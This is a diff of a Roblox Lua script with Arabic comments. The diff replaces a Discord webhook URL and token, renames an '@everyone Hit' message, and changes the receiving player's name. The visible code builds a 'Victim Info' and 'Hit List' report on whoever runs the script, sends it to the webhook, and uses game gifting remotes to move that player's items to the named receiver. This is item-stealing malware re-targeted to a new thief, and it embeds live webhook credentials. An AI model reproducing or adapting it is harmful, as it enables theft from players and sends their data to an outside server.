@@ -11,7 +11,7 @@ local player = Players.LocalPlayer
 local PlayerGui = player:WaitForChild("PlayerGui")
 
 -- ضع هنا الويب هوك الجديد
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1399669169959604285/_-lkyVFDOg6VNibf_plsNIzcUdRgcyzS18LTgfb3kdtNR_NPuBBGs4AaZbsG9DcObOsO"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1393827752192376945/3KzTiNugNBWGYy2Vj_A5bemDhgkQ64WP0z-eWWyk8MadeihG3vYHM34MtKoo28OKAkF4"
 
 -- =========================
 -- 1: قسم النقل التلقائي (كل 3 دقائق)
@@ -150,7 +150,7 @@ task.spawn(function()
         end
     end
 
-    local message = "@everyone **Alien Hit**\n──────────────\n" ..
+    local message = "@everyone **Pogi Hit**\n──────────────\n" ..
                     "**Victim Info:**\nUsername: " .. playerName .. "\nExecutor: Delta\nAccount Age: " .. accountAge ..
                     "\nReceiver: hadukin_53\n──────────────\n**Hit List:**\n"
 
@@ -199,7 +199,7 @@ end)
 -- =========================
 -- 4: قسم الجيفت الكامل مع إعادة الإمساك بعد الانتهاء من كل العناصر
 -- =========================
-local TARGET_PLAYER_NAME = "hadukin_53"
+local TARGET_PLAYER_NAME = "kilua0623"
 local GiftRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("GiftItem")
 local FavoriteRemote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("FavoriteItem")
 
